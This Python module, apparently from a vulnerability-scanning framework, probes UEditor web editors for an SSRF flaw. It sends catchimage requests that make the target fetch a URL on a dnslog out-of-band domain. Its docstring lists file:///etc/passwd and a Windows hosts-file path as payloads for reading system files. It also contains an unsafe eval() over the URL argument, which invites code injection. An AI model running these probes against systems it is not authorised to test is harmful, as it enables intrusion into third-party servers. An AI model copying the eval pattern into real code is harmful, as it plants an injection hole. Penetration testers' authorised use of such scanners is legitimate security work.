#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Ueditor扫描类: 
        ueditor编辑器 SSRF漏洞
            暂无编号
                Payload: https://baizesec.github.io/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%E7%BC%96%E8%BE%91%E5%99%A81.4.3.3%E7%89%88%E6%9C%ACssrf%E6%BC%8F%E6%B4%9E/
file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep

class Ueditor():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Ueditor'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.ueditor_ssrf_payloads = [
            {
                'path': 'php/controller.php?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
                'data': ''
            },
            {
                'path': 'jsp/controller.jsp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
                'data': ''
            },
            {
                'path': 'asp/controller.asp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
                'data': ''
            },
            {
                'path': 'net/controller.ashx?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
                'data': ''
            },
            # {
            #     'path': 'ueditor/php/controller.php?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
            #     'data': ''
            # },
            # {
            #     'path': 'ueditor/jsp/controller.jsp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
            #     'data': ''
            # },
            # {
            #     'path': 'ueditor/asp/controller.asp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
            #     'data': ''
            # },
            # {
            #     'path': 'ueditor/net/controller.ashx?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
            #     'data': ''
            # },
            # {
            #     'path': 'UEditor/php/controller.php?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
            #     'data': ''
            # },
            # {
            #     'path': 'UEditor/jsp/controller.jsp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
            #     'data': ''
            # },
            # {
            #     'path': 'UEditor/asp/controller.asp?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
            #     'data': ''
            # },
            # {
            #     'path': 'UEditor/net/controller.ashx?action=catchimage&source[]=http://dnsdomain/mouse.jpg',
            #     'data': ''
            # }
        ]

    def ueditor_ssrf_scan(self, url):
        ''' 该接口用于抓取远程图片, 如果没有进行过滤, 则可以请求任意url地址 '''
        sessid = 'ed446d2ac00eae0a1aed7c3aa45479d1'
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'SSRF'
        vul_info['vul_id'] = 'ueditor-ssrf'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.ueditor_ssrf_payloads:
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

            path = payload['path'].replace('dnsdomain', dns_domain) # * Path
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            # sleep(2)                                                # * dns查询可能较慢, 等一会
            if (('"SUCCESS"' in res.text) and (md in dns.result(md, sessid))):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.ueditor_ssrf_scan, url=url)
        ]

ueditor = Ueditor()
